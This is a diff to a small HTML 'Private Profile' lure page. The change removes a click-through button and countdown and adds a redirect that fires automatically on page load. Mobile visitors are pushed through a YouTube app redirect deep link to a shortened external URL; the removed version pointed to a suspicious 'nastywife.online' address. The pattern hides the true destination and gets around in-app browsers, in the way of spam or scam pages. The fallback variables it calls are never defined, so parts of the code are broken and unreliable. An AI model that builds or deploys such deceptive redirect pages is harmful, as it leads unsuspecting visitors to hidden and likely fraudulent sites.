@@ -1,54 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link rel="stylesheet" href="css/style2.css">
-<script src="script.js"></script>
-<link rel="icon" href="/favicon.ico" />
-<link rel="apple-touch-icon" href="/logo192.png" />
-<title>Private Profile</title>
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="css/style2.css">
+  <script src="script.js"></script>
+  <link rel="apple-touch-icon" href="/logo192.png" />
+  <title>Private Profile</title>
 </head>
 
 <body>
   <img src="img/300.jpg" alt="Profile Picture">
-  <button onclick="myFunction()">View my profile</button>
-  <p>You will be automatically redirected to my profile</p>
-  <p id="countdown"></p>
+  <p id="countdown">You will be automatically redirected to my profile</p>
+  
+  <script>
+    var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbFRmWnhZVGxib1lYdkJHU3pCaTk5VE1fWHBtQXxBQ3Jtc0tuOFBnWEwyU2gzaFM3aHREdjJyMmM1RzNqR2k0U1FCSnZvRkVCMFBRVmpmaHozZy1Xb0l5Ujl4SXk3U3FudGNyLVJXQkhiSnBsVjhwSkxkODR4ZDdIMTBOSVFVOU0tYnNuUnl5NkZMR29IQ3VqN0VlYw&q=https%3A%2F%2Fv.ht%2FqAL1C&html_redirect=1";
 
- <script>
-   var countdownEl = document.getElementById('countdown');
-  var countdownTime = 3;
-  countdownEl.innerHTML = countdownTime;
+    document.addEventListener('DOMContentLoaded', function() {
+      setTimeout(function() {
 
-  var countdownInterval = setInterval(function() {
-    countdownTime--;
-    countdownEl.innerHTML = countdownTime;
-    if (countdownTime == 0) {
-      clearInterval(countdownInterval);
-      myFunction();
-    }
-  }, 1000);
-	  
-    function myFunction() {
-      var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbnpEdjZsUW95eDdXTk9pZXpHWnVSVzFyTzFXd3xBQ3Jtc0ttS3lKM2VrRTNubGJYVUcxSFlYTXBINUJZUk1XWExsS3NQSk9hNVNTa3NVNTlTcnlkWFpFeENEcXczWVMyQlhwSEtZbU9mRHFCUTZFTGwzTHFQdUdWSlZ3YVQ0S1FBSnotcHlSTkFKYkk2X0R1Z2JTOA&q=https%3A%2F%2Fbhhaceb.nastywife.online%2Fs%2F641346d72966f&html_redirect=1";
-	
-      if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-        window.location.href = app;
-        window.setTimeout(function() {
-          window.location.href = mobileFallback;
-        }, 25);
-      } else {
-        window.location.href = desktopFallback;
-      }
-	  
-	   function killPopup() {
-        window.removeEventListener('pagehide', killPopup);
-    }
+        if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+          window.location.href = app;
+          window.setTimeout(function() {
+            window.location.href = mobileFallback;
+          }, 25);
+        } else {
+          window.location.href = desktopFallback;
+        }
 
-    window.addEventListener('pagehide', killPopup);
-    }
+        function killPopup() {
+          window.removeEventListener('pagehide', killPopup);
+        }
 
-</script>
+        window.addEventListener('pagehide', killPopup);
+      }, 10);
+    });
+  </script>
+
 </body>
 </html>
